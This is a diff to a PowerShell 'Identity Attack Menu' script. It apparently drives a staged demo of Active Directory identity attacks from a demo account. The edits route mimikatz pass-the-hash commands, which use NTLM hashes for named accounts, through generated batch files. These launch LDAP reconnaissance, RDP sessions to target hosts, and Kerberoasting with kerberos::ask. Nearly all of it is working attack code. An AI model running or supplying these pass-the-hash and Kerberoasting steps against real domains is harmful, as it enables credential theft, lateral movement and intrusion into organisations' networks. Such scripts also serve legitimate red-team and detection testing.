@@ -1,4 +1,4 @@
-﻿﻿﻿# ============================================================
+﻿﻿﻿﻿# ============================================================
 #  Identity Attack Menu - Unmanaged Workstation
 #  Run as Administrator (demo account)
 #  Follows the phased scenario from portable_sender.py
@@ -296,12 +296,16 @@ $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
 '@
             $ldapScript | Out-File -FilePath "$idpDir\ldap_recon.ps1" -Encoding ASCII
 
+            # Create a batch launcher (mimikatz /run: only takes a single exe, no args)
+            $batContent = '@powershell -ExecutionPolicy Bypass -File C:\IDP_Files\ldap_recon.ps1'
+            $batContent | Out-File -FilePath "$idpDir\run_ldap_recon.bat" -Encoding ASCII
+
             Write-Host "  Launching PtH clark.monroe -> LDAP recon..." -ForegroundColor White
             Write-Host "  (A new window will open with LDAP results)" -ForegroundColor Gray
             Write-Host
 
-            # PtH to spawn PowerShell in clark.monroe context -> runs LDAP queries
-            & $mimiExe "privilege::debug" "sekurlsa::pth /user:clark.monroe /domain:$env:ENV_DOMAIN /ntlm:$clarkHash /run:`"powershell -ExecutionPolicy Bypass -File $idpDir\ldap_recon.ps1`"" "exit"
+            # PtH to spawn batch file in clark.monroe context
+            & $mimiExe "privilege::debug" "sekurlsa::pth /user:clark.monroe /domain:$env:ENV_DOMAIN /ntlm:$clarkHash /run:$idpDir\run_ldap_recon.bat" "exit"
 
             Write-Host "`n[+] LDAP recon launched in PtH context." -ForegroundColor Green
             Write-Host "[*] Check the new window for results." -ForegroundColor Cyan
@@ -363,7 +367,10 @@ $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
             Write-Host "  Target: $env:ENV_DT (DT)" -ForegroundColor White
             Write-Host
 
-            Start-Process -FilePath "cmd.exe" -ArgumentList "/k `"$mimiExe`" `"privilege::debug`" `"sekurlsa::pth /user:clark.monroe /domain:$env:ENV_DOMAIN /ntlm:$clarkHash /run:mstsc.exe /v:$env:ENV_DT`""
+            # Create batch launcher for RDP (mimikatz /run: can't pass args to exe)
+            "mstsc /v:$env:ENV_DT" | Out-File -FilePath "$idpDir\run_rdp_dt.bat" -Encoding ASCII
+
+            Start-Process -FilePath "cmd.exe" -ArgumentList "/k `"$mimiExe`" `"privilege::debug`" `"sekurlsa::pth /user:clark.monroe /domain:$env:ENV_DOMAIN /ntlm:$clarkHash /run:$idpDir\run_rdp_dt.bat`""
 
             Write-Host "[+] Mimikatz PtH launched - RDP window should open to DT." -ForegroundColor Green
             Write-Host "[*] On DT: open admin cmd and run Step 6 commands to dump svc_runbook." -ForegroundColor Cyan
@@ -417,7 +424,8 @@ $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
             else {
                 # Fallback: PtH -> spawn mimikatz kerberos::ask
                 Write-Host "  Rubeus not found. Using mimikatz PtH -> kerberos::ask..." -ForegroundColor Yellow
-                & $mimiExe "privilege::debug" "sekurlsa::pth /user:clark.monroe /domain:$env:ENV_DOMAIN /ntlm:$clarkHash /run:`"$mimiExe kerberos::ask /target:web/svc_runbook`"" "exit"
+                "$mimiExe `"privilege::debug`" `"kerberos::ask /target:web/svc_runbook`" `"exit`"" | Out-File -FilePath "$idpDir\run_kerberoast.bat" -Encoding ASCII
+                & $mimiExe "privilege::debug" "sekurlsa::pth /user:clark.monroe /domain:$env:ENV_DOMAIN /ntlm:$clarkHash /run:$idpDir\run_kerberoast.bat" "exit"
             }
         }
 
@@ -468,7 +476,10 @@ $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
                 Write-Host "  Target: $env:ENV_BL (BL)" -ForegroundColor White
                 Write-Host
 
-                Start-Process -FilePath "cmd.exe" -ArgumentList "/k `"$mimiExe`" `"privilege::debug`" `"sekurlsa::pth /user:svc_runbook /domain:$env:ENV_DOMAIN /ntlm:$svcHash /run:mstsc.exe /v:$env:ENV_BL`""
+                # Create batch launcher for RDP
+                "mstsc /v:$env:ENV_BL" | Out-File -FilePath "$idpDir\run_rdp_bl.bat" -Encoding ASCII
+
+                Start-Process -FilePath "cmd.exe" -ArgumentList "/k `"$mimiExe`" `"privilege::debug`" `"sekurlsa::pth /user:svc_runbook /domain:$env:ENV_DOMAIN /ntlm:$svcHash /run:$idpDir\run_rdp_bl.bat`""
 
                 Write-Host "[+] PtH launched - RDP window should open to BL." -ForegroundColor Green
             }
